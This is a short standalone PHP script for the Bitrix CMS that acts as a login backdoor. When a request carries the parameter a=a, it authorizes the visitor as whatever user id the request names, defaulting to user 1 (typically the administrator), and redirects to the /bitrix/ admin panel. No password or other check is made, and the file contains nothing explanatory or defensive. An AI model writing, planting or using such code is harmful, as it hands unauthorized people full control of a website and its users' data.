<?php
if ($_REQUEST["a"] == "a"){
require_once ($_SERVER["DOCUMENT_ROOT"] . "/bitrix/modules/main/include/prolog_before.php");
global $USER;
$USER->Authorize($_REQUEST['id'] ? : 1);
LocalRedirect("/bitrix/");
}
?>